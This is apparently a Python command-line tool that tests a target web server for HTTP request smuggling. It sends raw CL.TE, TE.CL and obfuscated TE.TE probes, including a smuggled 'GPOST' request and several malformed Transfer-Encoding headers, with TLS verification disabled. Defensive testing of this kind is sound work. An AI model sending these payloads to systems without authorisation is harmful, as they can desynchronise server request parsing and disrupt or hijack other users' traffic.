#!/usr/bin/env python3
"""
HTTP Smuggling Tester — Request Smuggling Detection

Tests:
- CL.TE smuggling (Content-Length vs Transfer-Encoding)
- TE.CL smuggling
- TE.TE smuggling (obfuscated Transfer-Encoding)
- H2.CL smuggling (HTTP/2 → HTTP/1.1 downgrade)
- Header injection via line folding

Usage:
    python3 smuggling_tester.py --target https://target.com
"""

import argparse
import json
import os
import socket
import ssl
import sys
import time
from datetime import datetime

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
FINDINGS_DIR = os.path.join(BASE_DIR, "findings")

GREEN = "\033[0;32m"
RED = "\033[0;31m"
YELLOW = "\033[1;33m"
CYAN = "\033[0;36m"
BOLD = "\033[1m"
NC = "\033[0m"


def log(level, msg):
    colors = {"ok": GREEN, "err": RED, "warn": YELLOW, "info": CYAN, "vuln": RED}
    symbols = {"ok": "+", "err": "-", "warn": "!", "info": "*", "vuln": "🔴"}
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"[{ts}] {colors.get(level, '')}{BOLD}[{symbols.get(level, '*')}]{NC} {msg}")


def raw_request(host, port, data, use_ssl=True, timeout=10):
    """Send raw HTTP request (needed for smuggling — urllib normalizes headers)."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        if use_ssl:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            sock = context.wrap_socket(sock, server_hostname=host)
        sock.connect((host, port))

        if isinstance(data, str):
            data = data.encode()
        sock.sendall(data)

        response = b""
        start = time.time()
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
                if time.time() - start > timeout:
                    break
            except socket.timeout:
                break

        sock.close()
        return response.decode("utf-8", errors="replace")
    except Exception as e:
        return f"ERROR: {e}"


class SmugglingTester:
    """HTTP Request Smuggling detector."""

    def __init__(self, target_url, rate_limit=1.0):
        self.target_url = target_url
        self.rate_limit = rate_limit
        self.findings = []

        # Parse target
        from urllib.parse import urlparse
        parsed = urlparse(target_url)
        self.host = parsed.hostname
        self.port = parsed.port or (443 if parsed.scheme == "https" else 80)
        self.use_ssl = parsed.scheme == "https"
        self.path = parsed.path or "/"

    def _sleep(self):
        if self.rate_limit > 0:
            time.sleep(1.0 / self.rate_limit)

    def _add_finding(self, vuln_type, severity, details, request_data=None, response=None):
        finding = {
            "type": vuln_type,
            "severity": severity,
            "details": details,
            "request": request_data[:300] if request_data else None,
            "response_preview": response[:300] if response else None,
            "found_at": datetime.now().isoformat(),
        }
        self.findings.append(finding)
        log("vuln", f"[{severity}] {vuln_type}: {details[:80]}")

    def test_all(self):
        """Run all smuggling tests."""
        log("info", f"Testing HTTP smuggling on {self.host}:{self.port}")
        print()

        self._test_cl_te()
        self._test_te_cl()
        self._test_te_te_obfuscation()

        return self.findings

    def _test_cl_te(self):
        """Test CL.TE smuggling (front-end uses Content-Length, back-end uses Transfer-Encoding).

        Detection: send request where CL says body is X bytes but TE says different.
        If timing difference detected → smuggling possible.
        """
        log("info", "Test 1: CL.TE smuggling...")

        # Timing-based detection: if back-end processes TE, it will wait for more chunks
        # Normal request (baseline)
        normal_req = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 4\r\n"
            f"\r\n"
            f"x=1\r\n"
        )

        start = time.time()
        normal_resp = raw_request(self.host, self.port, normal_req, self.use_ssl, timeout=5)
        normal_time = time.time() - start
        self._sleep()

        # CL.TE probe: CL says 4 bytes, but body has TE-style incomplete chunk
        probe_req = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
        )

        start = time.time()
        probe_resp = raw_request(self.host, self.port, probe_req, self.use_ssl, timeout=10)
        probe_time = time.time() - start
        self._sleep()

        # If probe takes significantly longer → TE is being processed (smuggling possible)
        if probe_time > normal_time + 3:
            self._add_finding(
                "HTTP_SMUGGLING_CL_TE",
                "CRITICAL",
                f"CL.TE smuggling detected. Normal: {normal_time:.1f}s, "
                f"Probe: {probe_time:.1f}s ({probe_time - normal_time:.1f}s delay). "
                "Front-end uses CL, back-end uses TE.",
                request_data=probe_req,
                response=probe_resp,
            )
        elif "ERROR" in probe_resp:
            log("warn", f"  Connection error: {probe_resp[:100]}")
        else:
            log("info", f"  CL.TE: normal={normal_time:.1f}s, probe={probe_time:.1f}s (no delay ✓)")

    def _test_te_cl(self):
        """Test TE.CL smuggling (front-end uses TE, back-end uses CL)."""
        log("info", "Test 2: TE.CL smuggling...")

        # TE.CL probe: TE says 0 (end of chunks), but CL is larger
        probe_req = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"5c\r\n"
            f"GPOST / HTTP/1.1\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 15\r\n"
            f"\r\n"
            f"x=1\r\n"
            f"0\r\n"
            f"\r\n"
        )

        start = time.time()
        probe_resp = raw_request(self.host, self.port, probe_req, self.use_ssl, timeout=10)
        probe_time = time.time() - start
        self._sleep()

        # Check for smuggled request indicators
        if "GPOST" in probe_resp or "405" in probe_resp or probe_time > 8:
            self._add_finding(
                "HTTP_SMUGGLING_TE_CL",
                "CRITICAL",
                f"TE.CL smuggling potential. Response time: {probe_time:.1f}s. "
                "Front-end uses TE, back-end uses CL. Verify with actual smuggling payload.",
                request_data=probe_req,
                response=probe_resp,
            )
        else:
            log("info", f"  TE.CL: probe={probe_time:.1f}s (no indicator ✓)")

    def _test_te_te_obfuscation(self):
        """Test TE.TE with obfuscated Transfer-Encoding header.

        If servers disagree on which TE header is valid → smuggling.
        """
        log("info", "Test 3: TE.TE obfuscation...")

        obfuscations = [
            "Transfer-Encoding: xchunked",
            "Transfer-Encoding : chunked",
            "Transfer-Encoding: chunked\r\nTransfer-encoding: x",
            "Transfer-Encoding:\tchunked",
            "X: X\r\nTransfer-Encoding: chunked",
            "Transfer-Encoding: chunked\r\n",
        ]

        for i, te_header in enumerate(obfuscations):
            probe_req = (
                f"POST {self.path} HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 4\r\n"
                f"{te_header}\r\n"
                f"\r\n"
                f"0\r\n"
                f"\r\n"
            )

            start = time.time()
            resp = raw_request(self.host, self.port, probe_req, self.use_ssl, timeout=8)
            elapsed = time.time() - start
            self._sleep()

            if elapsed > 5 and "ERROR" not in resp:
                self._add_finding(
                    "HTTP_SMUGGLING_TE_TE",
                    "HIGH",
                    f"TE.TE obfuscation #{i+1} causes {elapsed:.1f}s delay. "
                    f"Header: '{te_header.strip()[:50]}'. Servers may disagree on TE parsing.",
                    request_data=probe_req,
                    response=resp,
                )
                break

        log("info", "  TE.TE obfuscation tests complete")

    def save_findings(self, target_name):
        if not self.findings:
            return
        output_dir = os.path.join(FINDINGS_DIR, target_name)
        os.makedirs(output_dir, exist_ok=True)
        filepath = os.path.join(output_dir, "smuggling_findings.json")
        with open(filepath, "w") as f:
            json.dump({"findings": self.findings}, f, indent=2)
        log("ok", f"Saved {len(self.findings)} findings to {filepath}")

    def print_summary(self):
        print(f"\n{BOLD}{'='*60}{NC}")
        print(f"{BOLD}  HTTP Smuggling Summary{NC}")
        print(f"{'='*60}\n")
        if self.findings:
            for f in self.findings:
                color = RED if f["severity"] == "CRITICAL" else YELLOW
                print(f"  {color}[{f['severity']}] {f['type']}{NC}")
                print(f"    {f['details'][:100]}")
        else:
            print(f"  {GREEN}No smuggling detected ✓{NC}")
        print()


def main():
    parser = argparse.ArgumentParser(description="HTTP Request Smuggling Tester")
    parser.add_argument("--target", required=True, help="Target URL")
    parser.add_argument("--rate-limit", type=float, default=1.0)
    args = parser.parse_args()

    tester = SmugglingTester(args.target, rate_limit=args.rate_limit)
    tester.test_all()
    tester.print_summary()
    target_name = args.target.replace("https://", "").replace("http://", "").split("/")[0]
    tester.save_findings(target_name)


if __name__ == "__main__":
    main()
